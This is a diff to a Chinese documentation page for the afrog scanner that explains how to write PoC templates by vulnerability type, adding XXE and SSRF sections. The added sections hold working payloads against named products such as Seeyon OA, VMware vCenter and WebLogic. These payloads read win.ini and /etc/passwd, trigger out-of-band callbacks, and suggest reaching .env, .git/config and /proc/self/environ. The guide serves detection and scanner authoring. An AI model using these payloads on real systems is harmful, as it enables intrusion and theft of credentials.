@@ -2,7 +2,7 @@
 title: 按漏洞类型的编写指南
 slug: /docs/poc/category-guide
 lang: zh
-summary: 按漏洞类型沉淀 afrog PoC 的编写要点与可复制的典型示例，已收录文件读取类、未授权访问类、命令执行类、SQL 注入类、文件上传类、弱口令爆破类与跨站脚本类，并附 PoC 质量检查清单。
+summary: 按漏洞类型沉淀 afrog PoC 的编写要点与可复制的典型示例，已收录文件读取类、XML 外部实体类、服务端请求伪造类、未授权访问类、命令执行类、SQL 注入类、文件上传类、弱口令爆破类与跨站脚本类，并附 PoC 质量检查清单。
 status: published
 source: new
 last_reviewed: 2026-09-23
@@ -72,7 +72,7 @@ afrog -t https://example.com -s fileread
 | 落点 | 说明 | 可用锚点 |
 | --- | --- | --- |
 | `/etc/passwd` | Linux 用户库，验证门槛最低 | `root:.*?:[0-9]*:[0-9]*:` |
-| `C:/Windows/win.ini` | Windows 固定配置文件 | `for 16-bit app support`、`fonts`、`extensions` |
+| `C:/Windows/win.ini` | Windows 固定配置文件 | `for 16-bit app support` |
 | `WEB-INF/web.xml` | Java 应用部署描述 | `<web-app`、`</web-app>` |
 | `WEB-INF/classes/application.yml` | Spring 配置 | `spring:`、`datasource` |
 | `.env` | 环境变量，常含密钥 | `APP_KEY=`、`DB_PASSWORD=` |
@@ -102,7 +102,7 @@ rules:
 expression: r0()
 ```
 
-Windows 配置文件。首行 `for 16-bit app support` 是语料里最通用的锚点，再叠加 `fonts`、`extensions` 做交叉校验：
+Windows 配置文件。首行 `for 16-bit app support` 是语料里最通用的锚点：
 
 ```yaml
 id: demo-windows-fileread
@@ -120,9 +120,7 @@ rules:
       path: /download?filename=c:/windows/win.ini
     expression: |
       response.status == 200 &&
-      response.body.bcontains(b"for 16-bit app support") &&
-      response.body.bcontains(b"fonts") &&
-      response.body.bcontains(b"extensions")
+      response.body.bcontains(b"for 16-bit app support") 
 expression: r0()
 ```
 
@@ -304,6 +302,241 @@ expression: r0()
 2. 完整文件通常一头一尾都有特征，尽量成对匹配：`<web-app` + `</web-app>`
 3. 不确定响应是不是页面时，加一条负向条件：`!response.body.bcontains(b"<html")`
 4. 锚点尽量落在文件开头附近，避免被 `-mrbs` 截断（见通用坑）
+
+## XML 外部实体类 (XXE)
+
+### 命名与检索
+
+命名通行做法是文件名与 `id` 以 `-xxe` 结尾，`tags` 里带上 `xxe`（通常还会叠加业务名，如 `seeyon,oa,xxe`）。
+
+```bash
+afrog -t https://example.com -s xxe
+```
+
+### 先分流：能不能把文件读出来
+
+| 形态 | 证据 | 请求数 |
+| --- | --- | --- |
+| 有回显（读文件） | 响应里带回文件内容 | 1 |
+| 盲 XXE（OOB） | 目标回连 OOB 平台 | 1 |
+| 报错型 | 报错信息里带出内容 | 1 |
+
+语料里绝大多数是**盲 XXE + OOB**：因为多数 XML 接口不会把解析结果回显出来，能回连上就已经证明实体被解析了。
+
+### 盲 XXE：用参数实体回连
+
+内置 PoC `jinhe-oa-xmlhttp-xxe`：
+
+```yaml
+id: jinhe-oa-xmlhttp-xxe
+
+info:
+  name: 金和OA-XmlHttp.aspx-XXE漏洞
+  author: avic123
+  severity: high
+  verified: true
+  tags: jinhe,oa,xxe
+  created: 2025/09/11
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /c6/Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx/
+      body: |
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "{{oob.HTTP}}/xxe_test">
+        %remote;]>
+        <root/>
+    expression: response.status == 200 && oobCheck(oob.ProtocolHTTP, 3)
+expression: r0()
+```
+
+要点：
+
+- **必须用参数实体（`%`）**，并且真的引用它（`%remote;`）。普通实体（`&xxe;`）要在 XML 里被引用才会展开，而盲打场景下我们没法控制模板去引用它
+- **判定是 `status == 200` 与 `oobCheck` 的组合**。单判 `oobCheck` 会把「接口本身报错、请求根本没被受理」也算成命中
+- 不需要在 `set` 里初始化 `oob`，`{{oob.HTTP}}` 可以直接用
+- 超时给 3 秒（HTTP），DNS 场景可以给到 5 秒；异步触发的场景再逐步调大
+
+> 语料里常见的 `oobCheck(oob.ProtocolHTTP, 3)` 与 `oobCheck("http", 3)` 是等价的——`oob.ProtocolHTTP` 的值本身就是字符串 `"http"`。两种写法都能正常工作，本文档统一用后者。
+
+**注入点未必在 body 主体**：内置 PoC `yonyou-u8-ufgovbank-xxe` 把 XML 塞进了表单参数，并且用的是更短的 DOCTYPE 外部 DTD 写法：
+
+```yaml
+      body: |
+        reqData=<?xml version="1.0"?>
+        <!DOCTYPE foo SYSTEM "{{oob.HTTP}}">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest
+    expression: oobCheck(oob.ProtocolHTTP, 3)
+```
+
+遇到表单型接口时，先判断 XML 是被当作参数值还是整个请求体——这决定你的 payload 要不要外层包装。
+
+### 有回显：直接读文件
+
+内置 PoC `seeyon-getajaxdataservlet-xxe`。它要发出去的 XML 原文是这样：
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
+]>
+<Signature><Field><a Index="ProtectItem">true</a><b Index="Caption">caption</b><c Index="ID">id</c><d Index="VALUE">&xxe;</d></Field></Signature>
+```
+
+整条 PoC：
+
+```yaml
+id: seeyon-getajaxdataservlet-xxe
+
+info:
+  name: 致远OA getAjaxDataServlet XXE
+  author: Wen
+  severity: critical
+  verified: true
+  tags: seeyon,oa,xxe
+  created: 2024/01/12
+  requires: [seeyon]
+  requires-mode: opportunistic
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /seeyon/m-signature/RunSignature/run/getAjaxDataServlet
+      body: |
+        S=ajaxColManager&M=colDelLock&imgvalue=lr7V9+0XCEhZ5KUijesavRASMmpz%2FJcFgNqW4G2x63IPfOy%3DYudDQ1bnHT8BLtwokmb%2Fk&signwidth=4.0&signheight=4.0&xmlValue=<上面那段 XML 的 URL 编码>
+    expression: |
+      (response.status == 200 || response.status == 206) &&
+      response.body.bcontains(b"for 16-bit app support")
+expression: r0()
+```
+
+要点：
+
+- **两个条件缺一不可**：先 `<!ENTITY xxe SYSTEM "file:///...">` 声明实体，再在 XML 里用 `&xxe;` **引用一次**。只声明不引用，实体不会被展开
+- **XML 要先 URL 编码再当参数发**：原文件里 `xmlValue=` 后面是一整串 `%3C%3Fxml...`，为便于阅读上面还原成了原始 XML。手工编写时记得先编码
+- **状态码可能是 `200` 或 `206`**，所以写成 `(response.status == 200 || response.status == 206)`
+- 有 `requires: [seeyon]` 与 `requires-mode: opportunistic` 门控，见 [requires 指纹门控](./04-requires.md)
+
+### 读文件的两个延伸
+
+- **Linux / Windows 分别给一组文件**：`/etc/passwd`、`c:/windows/win.ini` 各写一条规则、顶层用 `||`。落点表与锚点可直接复用文件读取类的结论
+- **换文件类型扩大战果**：配置文件（`web.xml`、`application.yml`）、凭据文件（`.env`、`.git/config`）都是老套路；云上目标还可以试 `/proc/self/environ`
+
+### 本类降误报要点
+
+1. 盲 XXE 的判定必须包含 `oobCheck`，否则任何返回 200 的接口都会命中
+2. 有回显时判定要落在文件自身结构（`[fonts]`、`root:` 正则）上，不要用宽泛词
+3. 实体必须被真正引用（`&xxe;` 或 `%remote;`），否则不会展开
+4. XML 作为表单参数传递时，要先做 URL 编码
+5. 高成本或依赖特定厂商的目标，加 `requires` 门控
+
+## 服务端请求伪造类 (SSRF)
+
+### 命名与检索
+
+命名通行做法是文件名与 `id` 以 `-ssrf` 结尾，`tags` 里带上 `ssrf`。
+
+```bash
+afrog -t https://example.com -s ssrf
+```
+
+### 先分流：怎么证明「服务端替我们发了请求」
+
+| 形态 | 证据 | 请求数 |
+| --- | --- | --- |
+| 回连 OOB 平台 | 目标回连到我们可控的地址 | 1 |
+| 读本地文件（`file://`） | 响应里带回文件内容 | 1 |
+| 回显了内网地址/端口 | 响应里带出请求的 `host:port`，或出现连接状态差异 | 1 |
+
+### 形态一：回连 OOB（最通用）
+
+内置 PoC `angjie-crm-rptviewer-ssrf`：
+
+```yaml
+id: angjie-crm-rptviewer-ssrf
+
+info:
+  name: 昂捷CRM-RptViewer.aspx存在SSRF漏洞
+  author: AVIC123
+  severity: high
+  verified: true
+  tags: angjie,SSRF
+  created: 2025/09/05
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /WebForms/RptViewer.aspx?ReportServer={{oob.HTTP}}
+    expression: response.status == 200 && oobCheck(oob.ProtocolHTTP, 3)
+expression: r0()
+```
+
+要点：
+
+- 把 `{{oob.HTTP}}` 当参数值传进去，判定交给 `oobCheck`。这一招最通用——不需要知道目标请求后拿到的内容是什么，只要它真的发出了请求
+- 同样建议把 `status == 200` 与 `oobCheck` 组合，避免接口本身报错也算命中
+- 前提是 OOB 平台已配好，见 [OOB 带外检测](./06-oob.md)
+
+### 形态二：`file://` 读本地文件
+
+内置 PoC `vmware-vcenter-provider-logo-ssrf`：
+
+```yaml
+id: vmware-vcenter-provider-logo-ssrf
+
+info:
+  name: Vmware VCenter - Arbitrary File Read
+  author: xpoc
+  severity: critical
+  verified: true
+  tags: vmware,vmware-vcenter,lfi,ssrf
+  created: 2024/01/05
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  r1:
+    request:
+      method: GET
+      path: /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///c://windows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+expression: r0() || r1()
+```
+
+要点：
+
+- **SSRF 的常见降级路径是文件读取**：参数只校验了「是不是 URL」，没限制协议，于是 `file://` 可以直接读本地文件
+- 注意 Windows 路径在示例里写成 `file:///c://windows/win.ini`（盘符后又跟了双斜杠）。不同实现对路径的容忍度不同，必要时多试几种写法
+- 这条 PoC 的 `tags` 同时带了 `lfi` 和 `ssrf`——它既是 SSRF 也是任意文件读取，检索时两边都能命中
+
+### 形态三：连不通也能证明
+
+内置 PoC `weblogic-ssrf` 请求的是一个**关闭的端口**：
+
+```yaml
+      path: /uddiexplorer/SearchPublicRegistries.jsp?...&operator=http://127.1.1.1:700
+    expression: 'response.status == 200 && (response.body.bcontains(b"&#39;127.1.1.1&#39;, port: &#39;700&#39;") || response.body.bcontains(b"Socket Closed"))'
+```
+
+要点：
+
+- 判定用的是 `Socket Closed`，或者错误信息里回显出来的 `'127.1.1.1', port: '700'`。**这说明 SSRF 判定不要求「拿到内容」**——响应里带出了我们指定的 `host:port`、或出现连接被拒的差异，就足以证明请求确实发出去了
+- 端口 700 是刻意选的关闭端口：`Socket Closed` 这种「连接失败」本身就是可利用信号。相反，如果目标把它当普通字符串处理、响应毫无变化，就得退回 OOB 那一条路
+- 换句话说，**可以对比开放端口与关闭端口的响应差异**来判断——两者的表现不同，就说明服务端真的去连了
+
+### 本类降误报要点
+
+1. 判定要落在「请求确实发出」的证据上：OOB 回连、内网地址/端口被回显、连接状态差异。不要只判 `response.status == 200`
+2. 回连地址用 OOB 平台，不要写死外部域名
+3. 能降级成文件读取时（`file://`），判定直接复用文件读取类的锚点
 
 ## 未授权访问类 (Unauthorized Access)
 
